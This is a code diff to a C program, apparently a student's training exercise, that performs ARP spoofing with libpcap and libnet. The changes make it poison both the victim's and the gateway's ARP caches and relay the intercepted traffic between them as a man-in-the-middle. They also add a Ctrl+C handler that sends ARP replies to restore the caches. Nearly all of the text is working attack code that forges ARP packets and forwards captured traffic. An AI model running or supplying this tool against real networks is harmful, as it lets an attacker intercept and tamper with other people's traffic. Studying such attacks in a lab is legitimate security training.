@@ -28,6 +28,8 @@
 #define ARPHDR_SIZE 8
 #define ARPDAT_SIZE 20
 
+pthread_t thread_id, thread_relay_id;
+
 char victim_mac_addr_str[MACSTR_MAX];
 char victim_ip_addr_str[IPSTR_MAX];
 char gateway_mac_addr_str[MACSTR_MAX];
@@ -42,6 +44,8 @@ void *get_victim_mac_pcap_thread(void *useless);
 void relaypacket_callback(u_char *pcd, const struct pcap_pkthdr *pkthdr, const u_char *packet);
 void packetfilter_callback(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet);
 void GetGatewayForInterface(const char *interface, char *gateway_ip);
+void recover_arp_spoofing(int signo);
+void relay_packet(void);
 
 int main(int argc, char **argv) {
     char track[] = "취약점"; char name[] = "이우진";
@@ -95,8 +99,6 @@ int main(int argc, char **argv) {
     build_arp_packet(arp_packet_for_victim, 1, victim_ip_addr_str);
     build_arp_packet(arp_packet_for_gateway, 1, gateway_ip_addr_str);
 
-    pthread_t thread_id, thread_relay_id;
-
     pthread_create(&thread_id, NULL, get_victim_mac_pcap_thread, &pcd);
     sleep(1);
     if (pcap_sendpacket(pcd, arp_packet_for_victim, 42 /* size */) != 0)
@@ -111,7 +113,7 @@ int main(int argc, char **argv) {
 
     // arp reply attack
     build_arp_packet(arp_packet_for_victim, 2, victim_ip_addr_str);
-    //build_arp_packet(arp_packet_for_gateway, 2, gateway_ip_addr_str);
+    build_arp_packet(arp_packet_for_gateway, 2, gateway_ip_addr_str);
     printf("\n[*] Sending Infected ARP Packet");
     printf("\n[*] ARP Infection Going~!(per 1 sec)\n");
     printf("   - Target IP addr :%s\n", victim_ip_addr_str);
@@ -120,6 +122,8 @@ int main(int argc, char **argv) {
     pthread_create(&thread_id, NULL, send_arp_spoofing_packet_thread, &pcd);
     pthread_create(&thread_relay_id, NULL, relay_packet_thread, &pcd);
     printf("[*] Relay Packet to Gateway..");
+    //relay_packet();
+    signal(SIGINT, recover_arp_spoofing);
     pthread_join(thread_id, NULL);
     pthread_join(thread_relay_id, NULL);
     /*
@@ -187,14 +191,24 @@ void relaypacket_callback(u_char *pcd, const struct pcap_pkthdr *pkthdr, const u
     unsigned char gateway_mac_addr[ETH_ALEN];
     unsigned char victim_mac_addr[ETH_ALEN];
 
-    struct libnet_ethernet_hdr *eth_header;     // struct ethhdr 도 가능
-    struct libnet_ipv4_hdr *ip_header;
+    struct libnet_ethernet_hdr *eth_header, *eth_header_frag, eth_header_frag_hard;     // struct ethhdr 도 가능
+    struct libnet_ipv4_hdr *ip_header, *ip_header_frag, ip_header_frag_hard;
     unsigned short etherh_protocoltype;
 
     char ip_src_str[IPSTR_MAX], ip_dst_str[IPSTR_MAX];
 
     eth_header = (struct libnet_ethernet_hdr *)packet;      // get ethernet header
     etherh_protocoltype = ntohs(eth_header->ether_type);    // get ethernet header -> protocol type
+
+    /*
+    for(int i=0; i<pkthdr->len; i++) {
+        if(i % 16 != 0)
+            printf("%.2x ", packet[i]);
+        else
+            printf("%.2x\n", packet[i]);
+    }
+    printf("=====================================\n");
+    */
 
     printf(".");
     if(etherh_protocoltype == ETHERTYPE_IP){
@@ -207,18 +221,20 @@ void relaypacket_callback(u_char *pcd, const struct pcap_pkthdr *pkthdr, const u
         inet_ntop(AF_INET, (struct in_addr *)&(ip_header->ip_src), ip_src_str, sizeof(ip_src_str));
         inet_ntop(AF_INET, (struct in_addr *)&(ip_header->ip_dst), ip_dst_str, sizeof(ip_dst_str));
 
+
+
         /* Ethernet header manipulation for relay~~! */
         for(int i=0; i<ETH_ALEN; i++) eth_header->ether_shost[i] = my_mac_addr[i];
         if(!strcmp(ip_src_str, victim_ip_addr_str) && strcmp(ip_dst_str, my_ip) != 0) {
-            //printf("[*] manipulation~!!\n");
+            printf("[*] Victim to Gateway Relay~~\n");
             for(int i=0; i<ETH_ALEN; i++) eth_header->ether_dhost[i] = gateway_mac_addr[i];
             if (pcap_sendpacket((pcap_t *)pcd, packet, pkthdr->len) != 0)
-            { fprintf(stderr,"\nError sending the packet: \n", pcap_geterr((pcap_t *)pcd));}
+            { fprintf(stderr,"\nError sending the packet(VtoG): %s\n", pcap_geterr((pcap_t *)pcd));}
         }
         else if(strcmp(ip_src_str, my_ip) != 0 && !strcmp(ip_dst_str, victim_ip_addr_str)) {
             for(int i=0; i<ETH_ALEN; i++) eth_header->ether_dhost[i] = victim_mac_addr[i];
             if (pcap_sendpacket((pcap_t *)pcd, packet, pkthdr->len) != 0)
-            { fprintf(stderr,"\nError sending the packet: \n", pcap_geterr((pcap_t *)pcd));}
+            { fprintf(stderr,"\nError sending the packet(GtoV): %s\n", pcap_geterr((pcap_t *)pcd));}
         }
 
         //printf("packet len : 0x%x\n", pkthdr->len);
@@ -262,10 +278,13 @@ void *send_arp_spoofing_packet_thread(void *useless) {
     if(pcd == NULL) { printf("%s\n", errbuf); exit(1); }
 
     build_arp_packet(arp_packet_for_victim, 2, victim_ip_addr_str);
+    build_arp_packet(arp_packet_for_gateway, 2, gateway_ip_addr_str);
     while(1) {
         sleep(1); printf(".");
         if (pcap_sendpacket(pcd, arp_packet_for_victim, 42 /* size */) != 0)
         { fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd)); return 0; }
+        //if (pcap_sendpacket(pcd, arp_packet_for_gateway, 42 /* size */) != 0)
+        //{ fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd)); return 0; }
     }
 
     return 0;
@@ -274,16 +293,16 @@ void *send_arp_spoofing_packet_thread(void *useless) {
 void *relay_packet_thread(void *useless) {
     char errbuf[PCAP_ERRBUF_SIZE];
     bpf_u_int32 netp, maskp;
-    struct bpf_program fp;
+    //struct bpf_program fp;
 
     char *dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
     if(dev == NULL) { printf("%s\n", errbuf); exit(1); }
     int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
     if(ret == -1) { printf("%s\n", errbuf); exit(1); }
-    pcap_t *pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, -1, errbuf);
+    pcap_t *pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 1, errbuf);
     if(pcd == NULL) { printf("%s\n", errbuf); exit(1); }
-    if(pcap_compile(pcd, &fp, "", 0, netp) == -1) { printf("compile error\n"); exit(1); }
-    if(pcap_setfilter(pcd, &fp) == -1) { printf("setfilter error\n"); exit(0); }
+    //if(pcap_compile(pcd, &fp, "", 0, netp) == -1) { printf("compile error\n"); exit(1); }
+    //if(pcap_setfilter(pcd, &fp) == -1) { printf("setfilter error\n"); exit(0); }
 
     pcap_loop(pcd, 0, relaypacket_callback, (u_char *)pcd);
 
@@ -363,6 +382,54 @@ void build_arp_packet(u_char* arp_packet, int operation, char* target_ip_str) {
             for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_tip[i] = gateway_ip_byte_arr[i];   // arp header : target ip address(gateway ip)
         }
     }
+    else if(operation == 3) {
+        arp_header->ar_op = htons(ARPOP_REPLY);                                             // Opcode : 0x0002(reply)
 
+        sscanf(victim_mac_addr_str, "%2x:%2x:%2x:%2x:%2x:%2x", victim_mac_addr, victim_mac_addr+1, victim_mac_addr+2, victim_mac_addr+3, victim_mac_addr+4, victim_mac_addr+5);
+        sscanf(gateway_mac_addr_str, "%2x:%2x:%2x:%2x:%2x:%2x", gateway_mac_addr, gateway_mac_addr+1, gateway_mac_addr+2, gateway_mac_addr+3, gateway_mac_addr+4, gateway_mac_addr+5);
+        if(strcmp(target_ip_str, gateway_ip_addr_str) != 0) {
+            for(int i=0; i<ETH_ALEN; i++) eth_header->ether_dhost[i] = victim_mac_addr[i];      // ethernet header : destination MAC address
+            for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_sha[i] = gateway_mac_addr[i];          // arp header : sender mac address(my mac)
+            for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_sip[i] = gateway_ip_byte_arr[i];   // arp header : sender ip address(gateway ip)
+            for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_tha[i] = victim_mac_addr[i];      // arp header : target mac address(victim mac)
+            for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_tip[i] = victim_ip_byte_arr[i];    // arp header : target ip address(victim ip)
+        } else {
+            for(int i=0; i<ETH_ALEN; i++) eth_header->ether_dhost[i] = gateway_mac_addr[i];     // ethernet header : destination MAC address
+            for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_sha[i] = victim_mac_addr[i];          // arp header : sender mac address(my mac)
+            for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_sip[i] = victim_ip_byte_arr[i];    // arp header : sender ip address(victim ip)
+            for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_tha[i] = gateway_mac_addr[i];     // arp header : target mac address(gateway mac)
+            for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_tip[i] = gateway_ip_byte_arr[i];   // arp header : target ip address(gateway ip)
+        }
+    }
     memcpy(arp_packet, build_packet, ARPPKT_SIZE);
+}
+
+void recover_arp_spoofing(int signo) {
+    u_char arp_packet_for_victim[42];
+    u_char arp_packet_for_gateway[42];
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    bpf_u_int32 netp, maskp;
+    struct bpf_program fp;
+
+    char *dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
+    if(dev == NULL) { printf("%s\n", errbuf); exit(1); }
+    int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
+    if(ret == -1) { printf("%s\n", errbuf); exit(1); }
+    pcap_t *pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, -1, errbuf);
+    if(pcd == NULL) { printf("%s\n", errbuf); exit(1); }
+
+    printf("CTRL + C Capture\n");
+    build_arp_packet(arp_packet_for_victim, 3, victim_ip_addr_str);
+    build_arp_packet(arp_packet_for_gateway, 3, gateway_ip_addr_str);
+    for(int i=0; i<10; i++) {
+        printf("CTRL + C Capture\n");
+        sleep(1);
+        if (pcap_sendpacket(pcd, arp_packet_for_victim, 42 /* size */) != 0)
+        { fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd)); }
+        if (pcap_sendpacket(pcd, arp_packet_for_gateway, 42 /* size */) != 0)
+        { fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd)); }
+    }
+
+    exit(0);
 }
